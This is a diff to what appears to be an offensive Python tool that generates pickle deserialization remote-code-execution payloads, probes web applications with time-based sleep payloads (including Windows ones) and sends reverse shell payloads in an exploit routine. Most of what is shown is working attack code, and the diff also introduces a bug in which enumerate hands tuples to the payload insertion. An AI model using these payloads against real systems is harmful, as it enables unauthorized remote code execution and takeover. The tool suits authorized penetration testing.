@@ -191,6 +191,7 @@ def generate_payload() -> list[str]: # todo: nadodati na postojeci pickle objekt
     payloads_list = []
 
     print_info("[+] Payloads relying on os module: ")
+    # print()
     print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
     for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
         payload = pickle.dumps(os_rce_payload(cmd), protocol=prot_num)
@@ -202,7 +203,8 @@ def generate_payload() -> list[str]: # todo: nadodati na postojeci pickle objekt
 
 
     print()
-    print_info("[+] Payloads relying on subprocess module: ")
+    print_info("[+] Payloads relying on subprocess module and /bin/sh shell: ")
+    # print()
     print(f"  [+] Pickle protocols 0-{pickle.HIGHEST_PROTOCOL}")
     for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
         payload = pickle.dumps(subprocess_rce_payload(cmd), protocol=prot_num)
@@ -344,11 +346,12 @@ def confirm_vuln():
     payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+1))).decode("utf-8"))
     payloads_list.append(base64.b64encode(pickle.dumps(pysleep_payload(sleep_time+2))).decode("utf-8"))
     payloads_list.extend(generate_payload_silent(f"sleep {sleep_time}"))
+    payloads_list.extend(utils.win_sleep5_prepickled)
     
 
 
     print("[+] Testing ...")
-    for payload in payloads_list:
+    for payload in enumerate(payloads_list):
         (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
         req = Request(method=method, url=url, headers=headers, data=data)
         prepared_req = req.prepare()
@@ -372,8 +375,11 @@ def confirm_vuln():
             
             if response2.elapsed.total_seconds() > sleep_time:
                 print()
-                print_green("\n[+] Tested web application is vulnerable!!!") 
+                print_info("[+] Tested web application is vulnerable!!!", greentext=True) 
                 print_info(f"[+] Payload causing sleep {sleep_time}: {payload}")
+                if payload in utils.win_sleep5_prepickled:
+                    print_info("[+] The tested web application seems to be running on Windows.")
+                    print_info("[+] To use exploit functionality run pysoserial on windows.")
                 print()
                 return
 
@@ -430,10 +436,10 @@ def exploit():
                 except requests.exceptions.SSLError:
                     print_red("[+] SSL error. Use --http flag?")
                     exit(1)
-            print(f"[+] Tried reverse shell num #{rs_index}")
+            print(f"[+] Senfing payload #{rs_index}")
         
-
-        print_green("\n[+] Done\n")
+        print()
+        print_info("[+] Done\n")
         return
     
 
